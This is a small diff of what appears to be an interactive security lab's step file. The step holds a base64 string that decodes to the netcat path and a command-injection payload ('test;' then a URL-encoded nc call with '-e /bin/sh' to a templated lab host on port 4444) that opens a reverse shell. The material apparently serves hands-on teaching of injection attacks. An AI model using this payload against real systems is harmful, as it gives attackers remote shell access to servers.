@@ -12,4 +12,4 @@
 
 `echo "L3Vzci9iaW4vbmMK" | base64 --decode`{{execute}}
 
-`test;nc%20 [[HOST_SUBDOMAIN]]-80-[[KATACODA_HOST]].[[KATACODA_DOMAIN]] %204444%20-e%20/bin/sh`{{copy}}
+test;nc%20[[HOST_SUBDOMAIN]]-80-[[KATACODA_HOST]].[[KATACODA_DOMAIN]]%204444%20-e%20/bin/sh
